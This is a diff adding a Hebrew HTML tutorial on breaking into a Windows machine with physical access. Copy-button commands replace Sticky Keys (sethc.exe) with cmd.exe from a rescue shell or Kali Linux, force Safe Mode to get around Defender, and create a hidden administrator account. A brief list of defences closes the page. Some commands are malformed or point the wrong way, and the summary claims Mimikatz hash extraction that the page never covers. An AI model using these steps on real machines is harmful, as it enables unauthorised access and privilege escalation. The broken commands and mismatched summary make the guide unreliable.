@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>מדריך למתקפה על Windows עם שינוי סדר אתחול</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
+      margin: 20px;
+      line-height: 1.6;
+    }
+    h1, h2 {
+      color: #0056b3;
+    }
+    pre {
+      background: #eeeeee;
+      padding: 10px;
+      border-radius: 8px;
+      position: relative;
+      overflow-x: auto;
+    }
+    .copy-btn {
+      position: absolute;
+      top: 8px;
+      left: 8px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 12px;
+    }
+    .copy-btn:hover {
+      background-color: #0056b3;
+    }
+    a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    ul {
+      margin-right: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<h1>מדריך למתקפה על Windows עם שינוי סדר אתחול ושימוש ב-Mimikatz</h1>
+
+<p>במדריך הזה, אציג את הדרך בה אפשר להשתמש במערכת הפעלה חיצונית (כגון Kali Linux) כדי לבצע התקפה על מחשב Windows, לשנות את סדר האתחול, להפעיל את ה-Command Prompt ולבצע מתקפות כמו שינוי הרשאות, שליפת סיסמאות ונתונים, והגנה מפני תוקפים.</p>
+
+<h2>התחלת המתקפה - שינוי סדר אתחול:</h2>
+<p>1. תחילה עלינו לשנות את סדר האתחול במחשב כדי לאתחל את המחשב בעזרת מערכת הפעלה חדשה.</p>
+<p>2. נכנס למצב "תיקון המחשב" דרך מסך אתחול (Boot) כדי להיכנס ל-“Troubleshoot” ואז לבחור ב-“Advanced Options”.</p>
+<p>3. בחר ב-“Command Prompt” ונמצא את עצמנו ב-“Rescue Shell”.</p>
+
+<h2>בדיקת דיסקים במערכת:</h2>
+<p>נשתמש בפקודת <code>wmic get name</code> או <code>wmic opticaldisk get name</code> כדי לראות את הדיסקים שמחוברים למחשב:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>wmic get name</pre>
+
+<h2>שינוי קבצים ב-System32:</h2>
+<p>כעת, נעבור לנתיב <code>\windows\system32</code> כדי לשנות את הקובץ <code>sethc.exe</code> (שמשמש עבור Sticky Keys) או קובץ אחר כמו <code>osk.exe</code> כדי להחליפם ב-<code>cmd.exe</code> או <code>ftp.exe</code>.</p>
+<p>פקודה לדוגמה:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>copy sethc.exe cmd.exe</pre>
+
+<p>אם המערכת משבשת את הפעולה, נוכל לשנות את הקובץ דרך <code>ftp.exe</code>:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>!cmd</pre>
+
+<h2>שימוש במצב Safe Mode:</h2>
+<p>אם ה-Defender חוסם את הפעולה, אפשר להפעיל את המחשב במצב "Safe Mode" (ללא הגנות):</p>
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>bcdedit /set {default} safeboot minimal</pre>
+<p>לאחר מכן השתמש בפקודת <code>shutdown</code> כדי לאתחל את המחשב מחדש:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>shutdown /f /r /t 0</pre>
+
+<h2>הגדרת משתמשים והרשאות:</h2>
+<p>1. <strong>יצירת משתמש חדש:</strong> כדי להוסיף משתמש חדש עם סיסמא:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>net user new_username Pa$$w0rd /add</pre>
+
+<p>2. <strong>שינוי הרשאות:</strong> להפוך את המשתמש החדש לאדמיניסטרטור:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>net localgroup administrators new_username /add</pre>
+
+<p>3. <strong>הסתרת משתמשים:</strong> נוכל להסתיר משתמשים דרך "Registry Editor" ולהגביל את הצגת המשתמשים במסך ההתחברות.</p>
+
+<h2>שימוש ב-Kali Linux (במערכת חי):</h2>
+<p>1. <strong>הפעלת Kali Linux:</strong> אם נשנה את סדר האתחול, נוכל להפעיל את Kali Linux ולהיכנס לדיסק של Windows.</p>
+<p>2. <strong>התקנת את הדיסק של Windows:</strong> השתמש בפקודות:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>fdisk -l</pre>
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>mount /dev/sda2 /mnt</pre>
+
+<p>3. <strong>העתקת הקבצים ב-System32:</strong> ננווט לנתיב <code>\windows\system32</code> ונבצע את ההעתקה מחדש:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>cp sethc.exe cmd.exe</pre>
+
+<p>4. <strong>הסנכרון והפסקת חיבור:</strong> סנכרן את השינויים והפסק את החיבור:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>sync</pre>
+<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>umount /mnt</pre>
+
+<h2>הגנה מפני התקפות Sticky Keys:</h2>
+<p>כדי להגן על המחשב, ניתן לנקוט בכמה פעולות:</p>
+<ul>
+  <li><strong>סיסמת BIOS:</strong> אם נשמור סיסמה ב-BIOS, אף אחד לא יוכל לשנות את סדר האתחול.</li>
+  <li><strong>הצפנה עם BitLocker:</strong> הצפנת הכונן תמנע גישה למידע אם המחשב יאבד.</li>
+  <li><strong>גישה מוגבלת:</strong> הגבלת גישה פיזית למחשב על ידי נעילת חדרים או שימוש באבטחה נוספת.</li>
+</ul>
+
+<h2>סיכום:</h2>
+<p>במדריך הזה, למדנו כיצד:</p>
+<ul>
+  <li>לשנות את סדר האתחול במחשב כדי להפעיל מערכת הפעלה חיצונית.</li>
+  <li>לעקוף את הגבלות ה-Defender של Windows.</li>
+  <li>ליצור משתמשים ולהעלות את הרשאותיהם.</li>
+  <li>לשלוף סיסמאות והאשינגים מהזיכרון של Windows.</li>
+  <li>לעבוד עם Kali Linux כדי לגשת למערכת.</li>
+  <li>להגן על עצמך מפני התקפות Sticky Keys.</li>
+</ul>
+
+<script>
+function copyText(button) {
+  const code = button.nextSibling.textContent;
+  navigator.clipboard.writeText(code.trim());
+  button.innerText = "הועתק!";
+  setTimeout(() => button.innerText = "העתק", 2000);
+}
+</script>
+
+</body>
+</html>
